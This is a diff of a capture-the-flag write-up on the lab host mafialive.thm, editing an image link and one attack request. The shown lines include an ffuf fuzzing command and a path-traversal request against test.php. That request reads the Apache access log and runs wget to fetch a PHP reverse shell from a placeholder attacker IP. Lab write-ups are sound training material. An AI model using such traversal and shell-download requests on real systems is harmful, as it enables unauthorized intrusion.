@@ -31,7 +31,7 @@ Now we can browse by typing the domain in the search bar and catch the first fla
 
 Next step is fuzzing the app, we will use ffuf for this:
 `ffuf -u "http://mafialive.thm/FUZZ" -w /usr/share/wordlists/dirb/common.txt -e .php -c -t 50 -r`
-![](https://github.com/user-attachments/assets/c385a2e2-937a-469a-b5a3-edfeb80ed229)
+![](https://github.com/user-attachments/assets/9afaaa9e-c40c-45d1-87eb-61a15c71be68)
 
 
 `robots.txt` and `test.php` both look interesting.
@@ -104,7 +104,7 @@ We can use it to upload a php reverse shell (Pentestmonkey's php reverse shell n
 
 
 Don't forget to URL encode the space (%20)
-`GET http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&wget%20http://xx.xx.xx.xx:8888/shell.php`
+`GET test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//../var/log/apache2/access.log&wget%20http://xx.xx.xx.xx:8888/shell.php`
 
 ![](https://github.com/user-attachments/assets/9d29b928-f84a-4f22-8ef5-000ec4634757)
 
